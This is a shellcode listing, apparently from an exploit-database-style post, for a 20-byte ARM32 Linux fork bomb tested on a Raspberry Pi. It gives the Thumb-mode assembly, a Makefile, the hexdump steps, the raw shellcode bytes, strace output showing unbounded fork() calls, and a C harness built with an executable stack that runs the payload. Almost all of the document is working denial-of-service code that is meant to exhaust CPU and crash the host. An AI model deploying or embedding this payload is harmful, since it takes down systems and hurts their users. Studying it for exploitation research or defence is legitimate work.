# Title:  Linux/ARM - Fork Bomb Shellcode (20 bytes)
# Date:   2019-10-07
# Category: Shellcode
# Tested: armv7l (32-bit)(Raspberry Pi 2 Model B) (OS: Raspbian Buster Lite)
# Author: CJHackerz
# Description: This shellcode creates new processes in infinite loop to exhaust CPU resources leading to crash

/*
## Compilation instruction

pi@raspberrypi:~ cat forkbomb_ARM32.s
.text
.global _start

_start:
	.code 32
	ADD R3, PC, #1	//Switching to Thumb mode
	BX R3

	.code 16
	_loop:
		EOR R7, R7
		MOV R7, #2	//Syscall to fork()
		SVC #1
		MOV R8, R8 //NOP
		BL _loop

pi@raspberrypi:~ cat Makefile
forkbomb_ARM32:  forkbomb_ARM32.o
	ld forkbomb_ARM32.o -o forkbomb_ARM32
forkbomb_ARM32.o:  forkbomb_ARM32.s
	as forkbomb_ARM32.s -o forkbomb_ARM32.o
clean:
	rm *.o forkbomb_ARM32
pi@raspberrypi:~ make
pi@raspberrypi:~ objcopy -O binary forkbomb_ARM32 forkbomb_ARM32.bin
pi@raspberrypi:~ hexdump -v -e '"\\""x" 1/1 "%02x" ""' forkbomb_ARM32.bin && echo
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff

## Testing compiled shellcode
pi@raspberrypi:~ file forkbomb_ARM32
forkbomb_ARM32: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, not stripped
pi@raspberrypi:~ strace ./forkbomb_ARM32
execve("./forkbomb_ARM32", ["./forkbomb_ARM32"], 0x7eab36e0 ) = 0
fork()                                  = 21975
fork()                                  = 22000
fork()                                  = 22016
fork()                                  = 22044
fork()                                  = 22087
fork()                                  = 22125
fork()                                  = 22162
fork()                                  = 22199
fork()                                  = 22242
fork()                                  = 22287
fork()                                  = 22326
fork()                                  = 23343
fork()                                  = 23501
fork()                                  = 23539
fork()                                  = 23606
fork()                                  = 26670
^Cstrace: Process 21974 detached

## Steps to compile given shellcode C program file
pi@raspberrypi:~ gcc -fno-stack-protector -z execstack forkbomb_ARM32.c -o forkbomb_ARM32-test

*/


#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff";
main(){

	printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;

	ret();
}